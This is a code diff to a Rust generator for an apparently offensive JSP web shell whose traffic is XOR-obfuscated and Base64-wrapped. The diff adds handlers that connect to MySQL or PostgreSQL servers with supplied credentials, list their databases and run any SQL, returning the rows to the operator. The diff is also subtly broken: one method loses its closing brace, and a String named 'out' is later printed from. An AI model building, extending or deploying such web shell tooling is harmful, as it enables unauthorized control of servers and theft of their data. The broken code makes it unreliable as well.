@@ -17,6 +17,8 @@ pub fn jsp_stub(
     h_delete: &str,
     h_rename: &str,
     h_mkdir: &str,
+    h_dbprobe: &str,
+    h_dbquery: &str,
 ) -> String {
     format!(
         r#"<%@ page import="java.io.*,java.util.*,java.nio.charset.*" %>
@@ -158,6 +160,89 @@ static String DSW_ren(String f, String t) {{
 }}
 static String DSW_mkdir(String p) {{
     return new File(p).mkdirs() ? "{{\\"ok\\":true,\\"data\\":null}}" : "{{\\"ok\\":false,\\"error\\":\\"mkdir failed\\"}}";
+static String DSW_dbprobe(String c) {{
+    try {{
+        String drv = DSW_json_get(c, "driver");
+        String host = DSW_json_get(c, "host");
+        String port = DSW_json_get(c, "port");
+        String user = DSW_json_get(c, "username");
+        String pass = DSW_json_get(c, "password");
+        String url;
+        if (drv.equals("mysql")) {{ url = "jdbc:mysql://" + host + ":" + (port.isEmpty() ? "3306" : port) + "/"; Class.forName("com.mysql.cj.jdbc.Driver"); }}
+        else if (drv.equals("pgsql")) {{ url = "jdbc:postgresql://" + host + ":" + (port.isEmpty() ? "5432" : port) + "/"; Class.forName("org.postgresql.Driver"); }}
+        else return "{{\"ok\":false,\"error\":\"unsupported driver: " + drv + "\"}}";
+        java.sql.Connection conn = java.sql.DriverManager.getConnection(url, user, pass);
+        java.sql.Statement st = conn.createStatement();
+        java.sql.ResultSet rs = st.executeQuery("SHOW DATABASES");
+        StringBuilder dbs = new StringBuilder("[");
+        boolean first = true;
+        while (rs.next()) {{
+            if (!first) dbs.append(",");
+            String n = rs.getString(1);
+            dbs.append("\"").append(n.replace("\\", "\\\\").replace("\"", "\\\"")).append("\"");
+            first = false;
+        }}
+        dbs.append("]");
+        rs.close(); st.close(); conn.close();
+        return "{{\"ok\":true,\"data\":{{\"databases\":" + dbs + "}}}}";
+    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"db probe failed: " + e.getMessage() + "\"}}"; }}
+}}
+static String DSW_dbquery(String c, String q) {{
+    try {{
+        String drv = DSW_json_get(c, "driver");
+        String host = DSW_json_get(c, "host");
+        String port = DSW_json_get(c, "port");
+        String user = DSW_json_get(c, "username");
+        String pass = DSW_json_get(c, "password");
+        String db = DSW_json_get(c, "dbname");
+        String url;
+        if (drv.equals("mysql")) {{ url = "jdbc:mysql://" + host + ":" + (port.isEmpty() ? "3306" : port) + "/" + db; Class.forName("com.mysql.cj.jdbc.Driver"); }}
+        else if (drv.equals("pgsql")) {{ url = "jdbc:postgresql://" + host + ":" + (port.isEmpty() ? "5432" : port) + "/" + db; Class.forName("org.postgresql.Driver"); }}
+        else return "{{\"ok\":false,\"error\":\"unsupported driver: " + drv + "\"}}";
+        java.sql.Connection conn = java.sql.DriverManager.getConnection(url, user, pass);
+        java.sql.Statement st = conn.createStatement();
+        boolean hasRs = st.execute(q);
+        if (hasRs) {{
+            java.sql.ResultSet rs = st.getResultSet();
+            java.sql.ResultSetMetaData md = rs.getMetaData();
+            int cols = md.getColumnCount();
+            StringBuilder colsJson = new StringBuilder("[");
+            for (int i = 1; i <= cols; i++) {{ if (i > 1) colsJson.append(","); colsJson.append("\"").append(md.getColumnLabel(i).replace("\\", "\\\\").replace("\"", "\\\"")).append("\""); }}
+            colsJson.append("]");
+            StringBuilder rowsJson = new StringBuilder("[");
+            boolean firstRow = true;
+            while (rs.next()) {{
+                if (!firstRow) rowsJson.append(",");
+                StringBuilder row = new StringBuilder("[");
+                for (int i = 1; i <= cols; i++) {{
+                    if (i > 1) row.append(",");
+                    Object v = rs.getObject(i);
+                    if (v == null) row.append("null");
+                    else row.append("\"").append(String.valueOf(v).replace("\\", "\\\\").replace("\"", "\\\"")).append("\"");
+                }}
+                row.append("]");
+                rowsJson.append(row);
+                firstRow = false;
+            }}
+            rowsJson.append("]");
+            rs.close();
+            return "{{\"ok\":true,\"data\":{{\"columns\":" + colsJson + ",\"rows\":" + rowsJson + ",\"affected\":0}}}}";
+        }} else {{
+            int affected = st.getUpdateCount();
+            st.close(); conn.close();
+            return "{{\"ok\":true,\"data\":{{\"columns\":[],\"rows\":[],\"affected\":" + affected + "}}}}";
+        }}
+    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"db query failed: " + e.getMessage() + "\"}}"; }}
+}}
+static String DSW_json_get(String json, String key) {{
+    String pat = "\"" + key + "\":\"";
+    int idx = json.indexOf(pat);
+    if (idx < 0) return "";
+    int start = idx + pat.length();
+    int end = json.indexOf("\"", start);
+    if (end < 0) return "";
+    return json.substring(start, end).replace("\\\"", "\"").replace("\\\\", "\\");
+}}
 }}
 %>
 <%
@@ -181,6 +266,8 @@ else if (h == {h_write}) out = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"), D
 else if (h == {h_delete}) out = DSW_del(DSW_val(req, "p"));
 else if (h == {h_rename}) out = DSW_ren(DSW_val(req, "f"), DSW_val(req, "t"));
 else if (h == {h_mkdir}) out = DSW_mkdir(DSW_val(req, "p"));
+else if (h == {h_dbprobe}) out = DSW_dbprobe(DSW_val(req, "c"));
+else if (h == {h_dbquery}) out = DSW_dbquery(DSW_val(req, "c"), DSW_val(req, "q"));
 byte[] resp = DSW_xor(out.getBytes(StandardCharsets.UTF_8), key);
 out.print("{{\\"data\\":\\"" + java.util.Base64.getEncoder().encodeToString(resp) + "\\",\\"code\\":200}}");
 %>
@@ -197,6 +284,8 @@ out.print("{{\\"data\\":\\"" + java.util.Base64.getEncoder().encodeToString(resp
         h_delete = h_delete,
         h_rename = h_rename,
         h_mkdir = h_mkdir,
+        h_dbprobe = h_dbprobe,
+        h_dbquery = h_dbquery,
     )
 }
 
